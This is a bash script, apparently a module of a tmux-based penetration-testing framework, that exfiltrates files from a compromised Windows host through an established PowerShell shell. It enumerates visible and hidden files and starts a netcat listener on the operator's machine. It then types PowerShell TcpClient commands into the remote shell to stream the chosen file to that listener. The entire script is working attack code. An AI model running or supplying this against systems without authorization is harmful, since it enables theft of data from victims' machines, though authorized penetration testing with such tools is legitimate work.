#!/usr/bin/env bash

_CMD_CURRENT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

_fetch_file_list() {
  local pane_id="$1"
  local files
  local files_hidden

  tmux send-keys -t "$pane_id" "clear" Enter
  tmux send-keys -t "$pane_id" 'Get-ChildItem -File -recurse | Select Name -ExpandProperty FullName' Enter
  sleep 1
  files="$(tmux capture-pane -t "$pane_id" -p)"
  files="$(echo "$files" | tail -n +2 | head -n -1)"
  tmux send-keys -t "$pane_id" "clear" Enter

  tmux send-keys -t "$pane_id" 'Get-ChildItem -Hidden -File -recurse | Select Name -ExpandProperty FullName' Enter
  sleep 1
  files_hidden="$(tmux capture-pane -t "$pane_id" -p)"
  files_hidden="$(echo "$files_hidden" | tail -n +2 | head -n -1)"
  files="$(printf "%s\n%s" "$files" "$files_hidden")"
  tmux send-keys -t "$pane_id" "clear" Enter

  tmux set-option -t "$pane_id" -p "@penmux-commander-pfs-hidden-file" "$(echo "$files" | fzf --cycle --border="sharp")"
}

commander_run() {
  local pane_id="$1"
  # local file_to_fetch="$(tmux command-prompt -p "Enter file to fetch: " "display-message -p '%%'")"
  tmux display-popup -w 80% -h 80% -E "$_CMD_CURRENT_DIR/powershell_fetch_socket.sh \"$pane_id\""
  local file_to_fetch="$(tmux show-options -t "$pane_id" -pqv "@penmux-commander-pfs-hidden-file")"
  tmux set-option -pu "@penmux-commander-pfs-hidden-file"

  local dst_file="###SessionDir###Files/${file_to_fetch}"
  dst_file="$(penmux_module_expand_options_string "$_MODULE_PATH" "$dst_file" "$pane_id")"
  dst_file="$(penmux_expand_tmux_format_path "$pane_id" "$dst_file")"
  local dst_dir="$(dirname "$dst_file")"
  local lhost="$(penmux_module_get_option "$_MODULE_PATH" "LocalHost" "$pane_id")"
  local lport="$(penmux_module_get_option "$_MODULE_PATH" "LocalTempPort" "$pane_id")"
  local listener_id

  if [[ ! -d "$dst_dir" ]]; then
    mkdir -p "$dst_dir" || return
  fi

  tmux new-window -P -d "nc -nlvp \"$lport\" > \"$dst_file\""

  tmux send-keys -t "$pane_id" "\$FileName = Get-ChildItem \"$file_to_fetch\" | Select Name -ExpandProperty FullName" Enter
  tmux send-keys -t "$pane_id" '[byte[]]$buffer = New-Object byte[] 1024' Enter
  tmux send-keys -t "$pane_id" '$FileStream = [System.IO.File]::OpenRead($FileName)' Enter
  tmux send-keys -t "$pane_id" "\$TcpClient = New-Object System.Net.Sockets.TcpClient(\"$lhost\", \"$lport\")" Enter
  tmux send-keys -t "$pane_id" '$Stream = $TcpClient.GetStream()' Enter
  tmux send-keys -t "$pane_id" 'while ( $bytes = $FileStream.Read($buffer,0,$buffer.count)) { $Stream.Write($buffer,0,$bytes) }' Enter
  tmux send-keys -t "$pane_id" '$FileStream.Close()' Enter
  tmux send-keys -t "$pane_id" '$Stream.Dispose()' Enter
  tmux send-keys -t "$pane_id" '$TcpClient.Dispose()' Enter
}
_fetch_file_list "$1"
